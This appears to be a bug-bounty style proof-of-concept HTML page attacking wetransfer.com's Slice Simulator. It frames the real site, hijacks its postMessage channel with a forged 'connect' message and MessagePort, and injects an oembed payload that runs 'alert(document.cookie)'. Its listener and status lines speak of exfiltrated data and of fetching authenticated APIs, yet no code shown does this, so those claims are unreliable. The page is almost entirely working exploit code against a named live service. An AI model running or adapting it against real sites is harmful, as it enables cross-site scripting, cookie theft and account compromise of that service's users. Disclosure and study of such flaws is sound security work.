<!DOCTYPE html>
<html>
<head>
  <title>PoC - wetransfer.com XSS via Slice Simulator</title>
</head>
<body>
  <h2>wetransfer.com XSS via Slice Simulator postMessage</h2>
  <p id="status">Loading iframe...</p>
  <pre id="result" style="background:#f0f0f0;padding:10px;max-height:400px;overflow:auto;display:none;"></pre>
  <iframe id="target" src="https://wetransfer.com/_next/data/frontsite-nextjs-6cf5dfb549/slice-simulator.json" style="width:100%;height:300px;border:1px solid #ccc;"></iframe>

  <script>
    const status = document.getElementById('status');
    const result = document.getElementById('result');
    const iframe = document.getElementById('target');
    const channel = new MessageChannel();

    window.addEventListener('message', (e) => {
      if (e.data && e.data.type === 'xss-exfil') {
        result.style.display = 'block';
        result.textContent = JSON.stringify(e.data.data, null, 2);
        status.textContent = 'Exfiltrated data from wetransfer.com (origin: ' + e.origin + ')';
        return;
      }

      if (!e.data || typeof e.data !== 'object') return;
      if (!e.data.requestID || !e.data.type) return;

      if (e.data.type === 'ready') {
        status.textContent = 'Got "ready" from ' + e.origin + '. Establishing channel...';
        let readyRequestID = e.data.requestID;

        iframe.contentWindow.postMessage(
          { requestID: 'attacker-0', type: 'connect', data: {} },
          '*',
          [channel.port2]
        );

        setTimeout(() => {
          channel.port1.postMessage({
            requestID: readyRequestID,
            status: 200,
            msg: 'ok',
            data: undefined
          });

          setTimeout(() => {
            channel.port1.postMessage({
              requestID: 'attacker-1',
              type: 'setSliceZone',
              data: [{
                id: 'xss-slice',
                slice_type: 'text_panel',
                primary: {
                  body: [{
                    type: 'embed',
                    oembed: {
                      embed_url: 'https://daemoon.me/daemoon.jpeg',
                      type: 'rich',
                      provider_name: 'poc',
                      html: '<img src=x onerror="alert(document.cookie)">'
                    }
                  }]
                },
                items: []
              }]
            });
            status.textContent = 'XSS payload sent. Fetching authenticated APIs from wetransfer.com...';
          }, 500);
        }, 300);
      }
    });
  </script>
</body>
</html>
